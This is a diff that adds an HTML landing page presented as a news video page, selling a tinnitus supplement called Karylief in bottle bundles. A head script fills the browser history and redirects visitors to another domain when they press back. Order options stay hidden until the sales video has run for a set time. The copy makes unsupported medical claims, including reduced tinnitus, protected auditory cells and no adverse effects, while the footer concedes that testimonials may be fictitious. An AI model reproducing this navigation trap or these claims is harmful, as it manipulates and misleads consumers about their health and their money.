@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en">
+	<meta http-equiv="content-type" content="text/html;charset=utf8" />
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Updated News</title>
+		<link rel="preconnect" href="https://fonts.googleapis.com/" />
+		<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+		<link href="https://fonts.googleapis.com/css2?family=Raleway:ital,wght@0,100..900;1,100..900&amp;family=Work+Sans:ital,wght@0,100..900;1,100..900&amp;display=swap" rel="stylesheet"/>
+		<link rel="stylesheet" href="assets/css/style.css" />
+		<script>
+			(function () {
+			  const POLL_MS = 500;
+			
+			  function getStorageKey() {
+			    const url = new URL(window.location.href);
+			    const current = url.searchParams.get("utm_source");
+			    if (current === "FB") return "lead";
+			    if (current === "google") return "lead-google";
+			    return null;
+			  }
+			
+			  function getLeadId(storageKey) {
+			    if (!storageKey) return null;
+			    const raw = localStorage.getItem(storageKey);
+			    if (!raw) return null;
+			    try {
+			      const obj = JSON.parse(raw);
+			      return obj && obj._id ? String(obj._id) : null;
+			    } catch {
+			      return null;
+			    }
+			  }
+			
+			  function applyUtmIfNeeded() {
+			    const url = new URL(window.location.href);
+			    const current = url.searchParams.get("utm_source");
+			    const storageKey = getStorageKey();
+			    const id = getLeadId(storageKey);
+			    if (!id) return false;
+			
+			    let desired = null;
+			    if (current === "FB") {
+			      desired = "FBjLj" + id;
+			    } else if (current === "google") {
+			      desired = "googlejLj" + id;
+			    }
+			
+			    if (!desired) return false; 
+			
+			    url.searchParams.set("utm_source", desired);
+			    window.location.replace(url.toString());
+			    return true;
+			  }
+			
+			  if (applyUtmIfNeeded()) return;
+			
+			  const interval = setInterval(() => {
+			    if (applyUtmIfNeeded()) clearInterval(interval);
+			  }, POLL_MS);
+			})();
+		</script>
+		<script>
+			const link = 'https://everydaywellnessguide.online/kary/back/';
+			
+			function setBackRedirect(url) {
+			  let urlBackRedirect = url;
+			  urlBackRedirect = urlBackRedirect =
+			    urlBackRedirect.trim() +
+			    (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+			    document.location.search.replace('?', '').toString();
+			
+			  history.pushState({}, '', location.href);
+			  history.pushState({}, '', location.href);
+			  history.pushState({}, '', location.href);
+			
+			  window.addEventListener('popstate', () => {
+			    console.log('onpopstate', urlBackRedirect);
+			    setTimeout(() => {
+			      location.href = urlBackRedirect;
+			    }, 1);
+			  });
+			}
+			
+			setBackRedirect(link);
+		</script>
+		<style>
+			.esconder {
+			display: none;
+			}
+		</style>
+		<script>
+			window.pixelId = "69442f99e95dbc262ca5c823";
+			var a = document.createElement("script");
+			a.setAttribute("async", "");
+			a.setAttribute("defer", "");
+			a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+			document.head.appendChild(a);
+		</script>
+		<script
+			src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+			data-utmify-prevent-xcod-sck
+			data-utmify-prevent-subids
+			data-utmify-ignore-iframe
+			data-utmify-is-cartpanda
+			async
+			defer
+			></script>
+		<!-- Google tag (gtag.js) -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-CM9JYLBCSZ"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());		
+			gtag('config', 'G-CM9JYLBCSZ');
+		</script>
+	</head>
+	<body>
+		<section class="news-header">
+			<div class="news-header__container">
+				<div class="header-logo">
+					<img 
+						src="assets/img/logo.webp" alt="Every Day Wellness Guide" width="300" height="80">
+				</div>
+			</div>
+		</section>
+		<main class="pdh center">
+			<div class="container">
+				<h1>Watch the full video below:</h1>
+				<vturb-smartplayer id="ab-694aeee87fac75e58d230d9e" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
+				<script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/528ac277-8029-4ec6-a3db-8da993dd5d9a/ab-test/694aeee87fac75e58d230d9e/player.js", s.async=!0,document.head.appendChild(s); </script>
+			</div>
+		</main>
+		<div class="esconder">
+			<!-- Countdown Timer 1 -->
+			<div class="countdown-wrapper">
+				<div class="countdown-container">
+					<h2 class="title countdown-title">
+						Claim Your Discounted <b>Karylief</b> Below For Huge Savings
+					</h2>
+				</div>
+			</div>
+			<section class="area-kits pd" id="kits">
+				<div class="container center">
+					<ul>
+						<li class="kit-option k1 smartplayer-click-event">
+							<a href="https://karylief.mycartpanda.com/checkout/200040878:1?afid=X9tMacNmKs">
+								<div class="header">Starter</div>
+								<div class="main">
+									<strong>2 BOTTLES</strong>
+									<span class="days">60 Day Supply</span>
+									<div class="area-img">
+										<img src="assets/img/2.png" alt="2 Bottles" />
+									</div>
+								</div>
+								<div class="footer">
+									<div class="price"><strong>$79</strong> / bottle</div>
+									<ul>
+										<li>60 DAYS GUARANTEE</li>
+									</ul>
+									<button class="button">
+									<img src="assets/img/button.webp" alt="Add To Cart" />
+									</button>
+									<img
+										src="assets/img/card.png"
+										alt="Credit Cards"
+										class="bandeiras"
+										/>
+									<div class="valores">
+										<span>Total: <s>358</s> $158</span>
+									</div>
+								</div>
+							</a>
+						</li>
+						<li class="kit-option best-option smartplayer-click-event">
+							<a href="https://karylief.mycartpanda.com/checkout/200040880:1?afid=X9tMacNmKs">
+								<div
+									class="header"
+									style="
+									background: linear-gradient(
+									180deg,
+									#ffdb05 0%,
+									#ffd815 100%
+									);
+									color: #0e0d11;
+									"
+									>
+									Best Seller
+								</div>
+								<div class="main">
+									<strong>6 BOTTLES</strong>
+									<span class="days">180 Day Supply</span>
+									<div class="area-img">
+										<img src="assets/img/6-b.png" alt="6 Bottles" />
+										<div class="save">
+											<b>Save $780</b>
+										</div>
+									</div>
+								</div>
+								<div class="footer">
+									<div class="price"><strong>$49</strong> / bottle</div>
+									<ul>
+										<li>3 FREE BONUSES!</li>
+										<li>FREE SHIPPING!</li>
+										<li>60 DAYS GUARANTEE</li>
+									</ul>
+									<button class="button">
+									<img src="assets/img/button.webp" alt="Add To Cart" />
+									</button>
+									<img
+										src="assets/img/card.png"
+										alt="Credit Cards"
+										class="bandeiras"
+										/>
+									<div class="valores">
+										<span>Total: <s>1074</s> $294</span>
+									</div>
+								</div>
+							</a>
+						</li>
+						<li class="kit-option k3 smartplayer-click-event">
+							<a href="https://karylief.mycartpanda.com/checkout/200040879:1?afid=X9tMacNmKs">
+								<div class="header">Standard</div>
+								<div class="main">
+									<strong>3 BOTTLES</strong>
+									<span class="days">90 Day Supply</span>
+									<div class="area-img">
+										<img src="assets/img/3-b.png" alt="3 Bottles" />
+										<div class="save">
+											<b>Save $330</b>
+										</div>
+									</div>
+								</div>
+								<div class="footer">
+									<div class="price"><strong>$69</strong> / bottle</div>
+									<ul>
+										<li>FREE SHIPPING!</li>
+										<li>60 DAYS GUARANTEE</li>
+									</ul>
+									<button class="button">
+									<img src="assets/img/button.webp" alt="Add To Cart" />
+									</button>
+									<img
+										src="assets/img/card.png"
+										alt="Credit Cards"
+										class="bandeiras"
+										/>
+									<div class="valores">
+										<span>Total: <s>537</s> $207</span>
+									</div>
+								</div>
+							</a>
+						</li>
+					</ul>
+				</div>
+			</section>
+			<section id="about" class="pd">
+				<img src="assets/img/ondas.svg" alt="" />
+				<div class="container">
+					<img src="assets/img/produto.webp" alt="karylief" />
+					<div class="content">
+						<div class="content">
+							<span class="sub">ABOUT PRODUCT</span>
+							<h2 class="title">
+								<b>Balance and well-being</b> starting with your ears
+							</h2>
+							<p>
+								<b>Karylief</b> is an innovative dietary supplement that works
+								to reduce tinnitus (ringing in the ears) and improve overall
+								hearing health.
+							</p>
+							<p>
+								With a precise combination of minerals and natural extracts, it
+								stimulates circulation, protects auditory cells, and promotes
+								relaxation, bringing more balance, silence, and quality of life
+								to your daily life.
+							</p>
+						</div>
+						<a href="#kits" class="btn">Order Now</a>
+					</div>
+				</div>
+			</section>
+			<section class="bene pd">
+				<div class="container">
+					<div class="content">
+						<h2 class="title">
+							Small capsules. Big changes <b>for your hearing.</b>
+						</h2>
+						<p class="sub">
+							Discover how Karylief can improve your routine and restore the
+							well-being of your ears:
+						</p>
+						<ul>
+							<li>
+								<img src="assets/img/i1.png" alt="" />
+								<div>
+									<h3>Reduces tinnitus</h3>
+									<p>
+										Combats the factors that cause tinnitus, providing natural
+										and lasting relief.
+									</p>
+								</div>
+							</li>
+							<li>
+								<img src="assets/img/i2.png" alt="" />
+								<div>
+									<h3>Supports hearing health</h3>
+									<p>
+										Improves blood circulation and protects the sensory cells of
+										the inner ear.
+									</p>
+								</div>
+							</li>
+							<li>
+								<img src="assets/img/i3.png" alt="" />
+								<div>
+									<h3>Improved focus</h3>
+									<p>
+										Stay productive and sharp, whether you’re working, studying,
+										or handling tasks that demand mental clarity.
+									</p>
+								</div>
+							</li>
+						</ul>
+					</div>
+					<div class="area-img">
+						<img src="assets/img/bene.png" alt="Karylief" />
+						<img src="assets/img/l1.svg" alt="" class="selinho s1" />
+						<img src="assets/img/l2.svg" alt="" class="selinho s2" />
+						<img src="assets/img/l3.svg" alt="" class="selinho s3" />
+						<img src="assets/img/l4.svg" alt="" class="selinho s4" />
+					</div>
+				</div>
+			</section>
+			<section class="ingredients pd">
+				<div class="container">
+					<div class="header-slider">
+						<div class="header-text">
+							<h2 class="title">Our <b>Ingredients</b></h2>
+							<span class="sub">A smart and natural formula for your ears</span>
+						</div>
+						<div class="slider-controls">
+							<button class="slider-btn prev" aria-label="Previous">
+								<svg
+									width="24"
+									height="24"
+									viewBox="0 0 24 24"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+									>
+									<path
+										d="M15 18L9 12L15 6"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										/>
+								</svg>
+							</button>
+							<button class="slider-btn next" aria-label="Next">
+								<svg
+									width="24"
+									height="24"
+									viewBox="0 0 24 24"
+									fill="none"
+									xmlns="http://www.w3.org/2000/svg"
+									>
+									<path
+										d="M9 18L15 12L9 6"
+										stroke="currentColor"
+										stroke-width="2"
+										stroke-linecap="round"
+										stroke-linejoin="round"
+										/>
+								</svg>
+							</button>
+						</div>
+					</div>
+					<div class="slider-container">
+						<div class="slider-track">
+							<div class="ingredient-card">
+								<div class="card-image">
+									<img src="assets/img/d1.png" alt="Magnesium" />
+								</div>
+								<h3>Magnesium (as glycinate)</h3>
+								<p>
+									An essential mineral for nerve and muscle function, promoting
+									auditory health and auditory function
+								</p>
+							</div>
+							<div class="ingredient-card">
+								<div class="card-image">
+									<img src="assets/img/d2.png" alt="Alpha Lipoic Acid" />
+								</div>
+								<h3>Alpha Lipoic Acid</h3>
+								<p>
+									An antioxidant that combats cellular damage and supports
+									auditory tissue health
+								</p>
+							</div>
+							<div class="ingredient-card">
+								<div class="card-image">
+									<img
+										src="assets/img/d3.png"
+										alt="Butcher's Broom (Ruscus aculeatus)"
+										/>
+								</div>
+								<h3>Butcher's Broom (Ruscus aculeatus)</h3>
+								<p>
+									Known for its vasodilatory and anti-inflammatory properties,
+									reducing inflammation
+								</p>
+							</div>
+							<div class="ingredient-card">
+								<div class="card-image">
+									<img src="assets/img/d4.png" alt="L-Carnitine" />
+								</div>
+								<h3>L-Carnitine</h3>
+								<p>
+									Promotes cellular energy and mitochondrial function of the
+									auditory cells
+								</p>
+							</div>
+							<div class="ingredient-card">
+								<div class="card-image">
+									<img src="assets/img/d5.png" alt="Turmeric (Curcuma longa)" />
+								</div>
+								<h3>Turmeric (Curcuma longa)</h3>
+								<p>
+									Natural anti-inflammatory that enhances the inner ear and
+									combats oxidative stress
+								</p>
+							</div>
+							<div class="ingredient-card">
+								<div class="card-image">
+									<img
+										src="assets/img/d6.png"
+										alt="Coenzyme Q10 (Ubiquinone)"
+										/>
+								</div>
+								<h3>Coenzyme Q10 (Ubiquinone)</h3>
+								<p>
+									Essential antioxidant for the regeneration and protection of
+									auditory cells
+								</p>
+							</div>
+						</div>
+					</div>
+					<div class="btn-wrapper center">
+						<a href="#kits" class="btn">Order Now</a>
+					</div>
+				</div>
+			</section>
+			<section class="comments pd">
+				<div class="container center">
+					<h2><b>Real Life</b> Changing Results:</h2>
+					<span class="aval wk">
+					</span>
+					<div class="videos-grid">
+						<div class="video-card">
+							<script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js", s.async=!0,document.head.appendChild(s); </script> 
+							<div id="ifr_694b57a887bdd2a5aeac9194_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
+								<div style="position: relative; padding: 133.33333333333331% 0 0 0;" id="ifr_694b57a887bdd2a5aeac9194_aspect"> <iframe frameborder="0" allowfullscreen src="about:blank" id="ifr_694b57a887bdd2a5aeac9194" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 16px;" referrerpolicy="origin" onload=" this.onload=null, this.src='https://scripts.converteai.net/528ac277-8029-4ec6-a3db-8da993dd5d9a/players/694b57a887bdd2a5aeac9194/v4/embed.html' +(location.search||'?') +'&vl=' +encodeURIComponent(location.href)"></iframe> </div>
+							</div>
+						</div>
+						<div class="video-card">
+							<script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js", s.async=!0,document.head.appendChild(s); </script> 
+							<div id="ifr_694b57a190b70171e37ca1f2_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
+								<div style="position: relative; padding: 133.33333333333331% 0 0 0;" id="ifr_694b57a190b70171e37ca1f2_aspect"> <iframe frameborder="0" allowfullscreen src="about:blank" id="ifr_694b57a190b70171e37ca1f2" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 16px;" referrerpolicy="origin" onload=" this.onload=null, this.src='https://scripts.converteai.net/528ac277-8029-4ec6-a3db-8da993dd5d9a/players/694b57a190b70171e37ca1f2/v4/embed.html' +(location.search||'?') +'&vl=' +encodeURIComponent(location.href)"></iframe> </div>
+							</div>
+						</div>
+						<div class="video-card">
+							<script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js", s.async=!0,document.head.appendChild(s); </script> 
+							<div id="ifr_694b57aca54e8f46c188cfd4_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
+								<div style="position: relative; padding: 133.33333333333331% 0 0 0;" id="ifr_694b57aca54e8f46c188cfd4_aspect"> <iframe frameborder="0" allowfullscreen src="about:blank" id="ifr_694b57aca54e8f46c188cfd4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 16px;" referrerpolicy="origin" onload=" this.onload=null, this.src='https://scripts.converteai.net/528ac277-8029-4ec6-a3db-8da993dd5d9a/players/694b57aca54e8f46c188cfd4/v4/embed.html' +(location.search||'?') +'&vl=' +encodeURIComponent(location.href)"></iframe> </div>
+							</div>
+						</div>
+						<div class="video-card">
+							<script type="text/javascript"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js", s.async=!0,document.head.appendChild(s); </script> 
+							<div id="ifr_694b57a4f757812677c36523_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
+								<div style="position: relative; padding: 133.33333333333331% 0 0 0;" id="ifr_694b57a4f757812677c36523_aspect"> <iframe frameborder="0" allowfullscreen src="about:blank" id="ifr_694b57a4f757812677c36523" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 16px;" referrerpolicy="origin" onload=" this.onload=null, this.src='https://scripts.converteai.net/528ac277-8029-4ec6-a3db-8da993dd5d9a/players/694b57a4f757812677c36523/v4/embed.html' +(location.search||'?') +'&vl=' +encodeURIComponent(location.href)"></iframe> </div>
+							</div>
+						</div>
+					</div>
+					<a href="#kits" class="btn">Order Now</a>
+				</div>
+			</section>
+			<section class="shipping">
+				<div class="container">
+					<img src="assets/img/shipping.png" alt="Blinzador" />
+					<div>
+						<h2 class="title">
+							Every <b>6 Bottle</b> Order Gets <b>FREE Shipping</b> Too!
+						</h2>
+						<span
+							>*97% Of Customers Order 6 Bottles (<b>Our Recommended Option</b
+							>)</span
+							>
+					</div>
+				</div>
+			</section>
+			<!-- Countdown Timer 2 -->
+			<div class="countdown-wrapper">
+				<div class="countdown-container">
+					<h2 class="title countdown-title">
+						Claim Your Discounted <b>Karylief</b> Below For Huge Savings
+					</h2>
+				</div>
+			</div>
+			<section class="area-kits pd al2">
+				<div class="container center">
+					<h2 class="title">Order Your <b>Karylief.</b></h2>
+					<p class="sub">
+						Select the package that fits your goals and save more:
+					</p>
+					<ul>
+						<li class="kit-option k1 smartplayer-click-event">
+							<a href="https://karylief.mycartpanda.com/checkout/200040878:1?afid=X9tMacNmKs">
+								<div class="header">Starter</div>
+								<div class="main">
+									<strong>2 BOTTLES</strong>
+									<span class="days">60 Day Supply</span>
+									<div class="area-img">
+										<img src="assets/img/2.png" alt="2 Bottles" />
+									</div>
+								</div>
+								<div class="footer">
+									<div class="price"><strong>$79</strong> / bottle</div>
+									<ul>
+										<li>60 DAYS GUARANTEE</li>
+									</ul>
+									<button class="button">
+									<img src="assets/img/button.webp" alt="Add To Cart" />
+									</button>
+									<img
+										src="assets/img/card.png"
+										alt="Credit Cards"
+										class="bandeiras"
+										/>
+									<div class="valores">
+										<span>Total: <s>358</s> $158</span>
+									</div>
+								</div>
+							</a>
+						</li>
+						<li class="kit-option best-option smartplayer-click-event">
+							<a href="https://karylief.mycartpanda.com/checkout/200040880:1?afid=X9tMacNmKs">
+								<div
+									class="header"
+									style="
+									background: linear-gradient(
+									180deg,
+									#ffdb05 0%,
+									#ffd815 100%
+									);
+									color: #0e0d11;
+									"
+									>
+									Best Seller
+								</div>
+								<div class="main">
+									<strong>6 BOTTLES</strong>
+									<span class="days">180 Day Supply</span>
+									<div class="area-img">
+										<img src="assets/img/6-b.png" alt="6 Bottles" />
+										<div class="save">
+											<b>Save $780</b>
+										</div>
+									</div>
+								</div>
+								<div class="footer">
+									<div class="price"><strong>$49</strong> / bottle</div>
+									<ul>
+										<li>3 FREE BONUSES!</li>
+										<li>FREE SHIPPING!</li>
+										<li>60 DAYS GUARANTEE</li>
+									</ul>
+									<button class="button">
+									<img src="assets/img/button.webp" alt="Add To Cart" /><img
+										src="assets/img/cursor.png"
+										alt=""
+										class="cursor"
+										/>
+									</button>
+									<img
+										src="assets/img/card.png"
+										alt="Credit Cards"
+										class="bandeiras"
+										/>
+									<div class="valores">
+										<span>Total: <s>1074</s> $294</span>
+									</div>
+								</div>
+							</a>
+						</li>
+						<li class="kit-option k3 smartplayer-click-event">
+							<a href="https://karylief.mycartpanda.com/checkout/200040879:1?afid=X9tMacNmKs">
+								<div class="header">Standard</div>
+								<div class="main">
+									<strong>3 BOTTLES</strong>
+									<span class="days">90 Day Supply</span>
+									<div class="area-img">
+										<img src="assets/img/3-b.png" alt="3 Bottles" />
+										<div class="save">
+											<b>Save $330</b>
+										</div>
+									</div>
+								</div>
+								<div class="footer">
+									<div class="price"><strong>$69</strong> / bottle</div>
+									<ul>
+										<li>FREE SHIPPING!</li>
+										<li>60 DAYS GUARANTEE</li>
+									</ul>
+									<button class="button">
+									<img src="assets/img/button.webp" alt="Add To Cart" />
+									</button>
+									<img
+										src="assets/img/card.png"
+										alt="Credit Cards"
+										class="bandeiras"
+										/>
+									<div class="valores">
+										<span>Total: <s>537</s> $207</span>
+									</div>
+								</div>
+							</a>
+						</li>
+					</ul>
+				</div>
+			</section>
+			<ul class="selos container">
+				<li>
+					<img src="assets/img/Truck.svg" alt="" />Guaranteed delivery on time
+				</li>
+				<li>
+					<img src="assets/img/ShieldCheck.svg" alt="" />Made in the United
+					States
+				</li>
+				<li>
+					<img src="assets/img/ShieldCheck.svg" alt="" />Secure financial data
+				</li>
+				<li>
+					<img src="assets/img/SealCheck.svg" alt="" />100% natural formula
+				</li>
+			</ul>
+			<section class="guarantee container">
+				<img src="assets/img/selo.png" alt="karylief" id="img-garantia" />
+				<div class="content">
+					<span>Guarantee</span>
+					<h2 class="title">100% Satisfaction — 60-Day Promise</h2>
+					<p>
+						Your purchase is protected by our 60-Day Satisfaction Promise from the original purchase date. If you’re not satisfied with your experience, simply contact us through 
+						<b><a href="https://karylief.com/contact.html" style="text-decoration: underline !important;">this link to our Contact Page</a></b>, 
+						and our team will make it right.
+					</p>
+					<div class="area-btn">
+						<a href="#kits" class="btn">ORDER NOW</a>
+					</div>
+				</div>
+			</section>
+			<section class="faq pd" id="faq">
+				<div class="container center">
+					<h2 class="title">Frequently Asked Questions</h2>
+					<div class="accordion-wrapper">
+						<!-- Coluna Esquerda -->
+						<div class="accordion">
+							<!-- 1 -->
+							<div class="item">
+								<div class="header">
+									<p>What is Karylief?</p>
+								</div>
+								<div class="body">
+									<p>
+										Karylief is a dietary supplement in capsule form, developed
+										to support hearing health, inner ear balance, and
+										relaxation. Its advanced formula combines magnesium, CoQ10,
+										and plant-based antioxidants that help reduce tinnitus,
+										support healthy circulation, and promote better sleep.
+									</p>
+								</div>
+							</div>
+							<!-- 3 -->
+							<div class="item">
+								<div class="header">
+									<p>What is the return policy?</p>
+								</div>
+								<div class="body">
+									<p>
+										Every order of <b>Karylief</b> is covered by a
+										<b>60-Day Satisfaction Promise</b> from the date of
+										purchase.
+									</p>
+									<p>
+										If you're not completely satisfied with your experience,
+										simply contact us through <b><a href="https://karylief.com/contact.html" style="text-decoration: underline !important;">
+										this link to our Contact Page</a></b> within 60
+										days, and our team will assist you promptly.
+									</p>
+								</div>
+							</div>
+							<!-- 5 -->
+							<div class="item">
+								<div class="header">
+									<p>How is Karylief different from other supplements?</p>
+								</div>
+								<div class="body">
+									<p>
+										Unlike most generic hearing supplements, Karylief combines
+										clinically studied nutrients such as
+										<b>Magnesium Glycinate</b>, <b>Alpha Lipoic Acid</b>,
+										<b>Turmeric</b>, and <b>Coenzyme Q10</b>—creating a unique
+										blend that supports both the auditory system and nervous
+										balance, helping to reduce tinnitus and promote calm sleep.
+									</p>
+								</div>
+							</div>
+							<!-- 7 -->
+							<div class="item">
+								<div class="header">
+									<p>How do I use Karylief?</p>
+								</div>
+								<div class="body">
+									<p>
+										Take one (1) capsule daily with water, preferably in the
+										morning or with your first meal. Do not exceed the
+										recommended dosage. Consistency is key for best results.
+									</p>
+								</div>
+							</div>
+							<!-- 9 -->
+							<div class="item">
+								<div class="header">
+									<p>Can I take Karylief with other supplements?</p>
+								</div>
+								<div class="body">
+									<p>
+										Yes, in most cases. However, since Karylief contains
+										magnesium and natural compounds that may influence
+										circulation and relaxation, we recommend consulting your
+										healthcare professional if you are taking medications or
+										other supplements.
+									</p>
+								</div>
+							</div>
+							<!-- 11 -->
+							<div class="item">
+								<div class="header">
+									<p>Is this a subscription?</p>
+								</div>
+								<div class="body">
+									<p>
+										No. Karylief is a one-time purchase unless you choose a
+										subscription option at checkout. We never auto-bill without
+										your consent.
+									</p>
+								</div>
+							</div>
+							<!-- 13 -->
+							<div class="item">
+								<div class="header">
+									<p>Still have questions?</p>
+								</div>
+								<div class="body">
+									<p>
+										Our team is here to help. Reach us anytime through 
+										<b><a href="https://karylief.com/contact.html" style="text-decoration: underline !important;">this link to our Contact Page</a></b> 
+										and we'll gladly assist you.
+									</p>
+								</div>
+							</div>
+						</div>
+						<!-- Coluna Direita -->
+						<div class="accordion">
+							<!-- 2 -->
+							<div class="item">
+								<div class="header">
+									<p>When will I receive my order?</p>
+								</div>
+								<div class="body">
+									<p>
+										Orders are processed within 24–48 hours and shipped directly
+										from our U.S. fulfillment center. Delivery usually takes
+										5–10 business days, and you’ll receive a tracking number as
+										soon as your package ships.
+									</p>
+								</div>
+							</div>
+							<!-- 4 -->
+							<div class="item">
+								<div class="header">
+									<p>Is it safe to buy online?</p>
+								</div>
+								<div class="body">
+									<p>
+										Yes. Our website uses 256-bit SSL encryption and secure,
+										PCI-compliant payment processors to ensure your personal and
+										payment information is fully protected.
+									</p>
+								</div>
+							</div>
+							<!-- 6 -->
+							<div class="item">
+								<div class="header">
+									<p>Will it work for me?</p>
+								</div>
+								<div class="body">
+									<p>
+										Many users report reduced tinnitus, improved hearing
+										comfort, and deeper sleep with consistent use of Karylief.
+										While individual results may vary, we back every order with
+										a
+										<b>60-day satisfaction guarantee</b> so you can try it
+										risk-free.
+									</p>
+								</div>
+							</div>
+							<!-- 8 -->
+							<div class="item">
+								<div class="header">
+									<p>Are there any side effects?</p>
+								</div>
+								<div class="body">
+									<p>
+										Karylief is made with carefully selected natural ingredients
+										that are generally recognized as safe for daily use. There
+										have been no reports of adverse effects. However, if you
+										have any medical condition or take prescription medications,
+										consult your doctor before use.
+									</p>
+								</div>
+							</div>
+							<!-- 10 -->
+							<div class="item">
+								<div class="header">
+									<p>How long does one bottle last?</p>
+								</div>
+								<div class="body">
+									<p>
+										Each bottle of Karylief contains 30 capsules, providing a
+										30-day supply when taken as directed.
+									</p>
+								</div>
+							</div>
+							<!-- 12 -->
+							<div class="item">
+								<div class="header">
+									<p>Where is Karylief made?</p>
+								</div>
+								<div class="body">
+									<p>
+										Karylief is manufactured and packaged in the USA under
+										strict quality and safety standards for dietary supplements,
+										using both domestic and carefully sourced global
+										ingredients.
+									</p>
+								</div>
+							</div>
+						</div>
+					</div>
+					<a href="#kits" class="btn">Order Now</a>
+				</div>
+			</section>
+		</div>
+		<!-- META + FEATURED BLOCK (ISOLADO) -->
+		<section class="news-meta-featured">
+			<!-- Featured On -->
+			<div class="news-meta-featured__featured">
+				<h2 class="news-meta-featured__featured-title">AS FEATURED ON:</h2>
+				<img 
+					src="assets/img/news.png" 
+					alt="As seen on logos"
+					class="news-meta-featured__featured-img"
+					>
+			</div>
+		</section>
+		<footer>
+			<div class="area-routulo container esconder">
+				<img src="assets/img/rotulo.png" alt="Memyts" class="rotulo" />
+			</div>
+			<span class="copy">
+			Copyright 2025 © Every Day Wellness Guide. All Rights Reserved. 19655 E 35th Drive
+			Suite 100 Aurora, CO 80011</span>
+			<nav>
+				<a href="https://karylief.com/terms.html">Terms & Conditions</a>
+				<a href="https://karylief.com/privacy.html">Privacy Policy</a>
+				<a href="https://karylief.com/contact.html">Contact</a>
+				<a href="https://karylief.com/disclaimer.html">Disclaimer</a>
+				<a href="https://karylief.com/reference.html">Reference</a>
+				<a href="https://karylief.com/refund.html">Refund</a>
+				<a href="https://karylief.com/shipping.html">Shipping</a>
+			</nav>
+			<div class="footer-cta">
+				<a href="https://karylief.com/dtc-b/?afid=X9tMacNmKs&src=btnorder" class="btn-outline">Order Now</a>
+			</div>
+			<div class="disclaimer container center">
+				<p>Disclaimer: This product is not intended to diagnose, treat, cure, or prevent any disease. Results may vary from person to person. Some testimonials may be fictitious. This information is not medical advice and should not be considered as such. Always consult your physician before changing your regular medical treatment. This is an advertorial and not a news article or blog post.
+				</p>
+				<p>
+					This site is not a part of the Google™ website or network of sites such as YouTube™, nor is it owned by Google™ or YouTube™ Inc. Additionally, this website is not endorsed by Google™ or YouTube™ Inc. in any way. Google™ is a trademark of its respective companies.
+				</p>
+				<p>
+					FDA Compliance: The information on this website has not been evaluated by the Food and Drug Administration (FDA) or any other medical authority. We do not intend to diagnose, treat, cure, or prevent any disease. The information is provided for educational purposes only. You should always consult your healthcare professional before acting on any content found on this website, especially if you are pregnant, nursing, taking medication, or have a medical condition.
+				</p>
+				<p>
+					Marketing Disclosure: This website is a marketplace. Therefore, you should be aware that the owner has a financial connection to the products and services advertised on this website. The owner receives compensation whenever a qualified lead is referred, and that is the extent of such connection.
+				</p>
+				<p>
+					Advertising Disclosure: This website and the products and services mentioned herein are advertising spaces. This website is an advertisement and not a news publication. Any photographs of people used on this website are models. The owner of this website and the products and services mentioned only provide a service through which consumers can obtain and compare information.
+				</p>
+				<p>
+					Read our testimonial disclaimer here: Some names and personal information on this website have been changed to protect the privacy of individuals. No individual result should be considered typical.
+				</p>
+			</div>
+		</footer>
+		<script src="assets/js/main.js"></script>
+		<script>
+			var listPitch = {
+			  '694aee9eb6c0dcc467226950': { delay: 2320, utm: 'utm_content=vslA' },
+			  '694aee9bb6c0dcc467226936': { delay: 1672, utm: 'utm_content=vslB' }
+			};
+			
+			var alreadyInitialized = false;
+			
+			var updateLinksWithUTM = function(utmParam) {
+			  var links = document.querySelectorAll('a[href]:not([href*="#"])');
+			  var separator = '?';
+			  var queryString = separator + utmParam;
+			  for (var i = 0; i < links.length; i++) {
+			    var link = links[i];
+			    if (link.href.indexOf(utmParam) !== -1) continue;
+			    if(utmParam === undefined) return
+			    var baseUrl = link.href.split('?')[0];
+			    link.href = baseUrl + queryString;
+			  }
+			};
+			
+			document.addEventListener('player:ready', function(event) {
+			  if (alreadyInitialized) return;
+			
+			  var detail = event.detail || {};
+			  var config = detail.config || {};
+			  var player = detail.player || document.querySelector('vturb-smartplayer');
+			  var playerId = config.id;
+			  var pitchConfig = listPitch[playerId];
+			
+			  if (!playerId || !pitchConfig) return;
+			
+			  alreadyInitialized = true;
+			
+			  player.displayHiddenElements(pitchConfig.delay, ['.esconder'], { persist: true });
+			  //updateLinksWithUTM(pitchConfig.utm);
+			});
+		</script>
+	</body>
+</html>
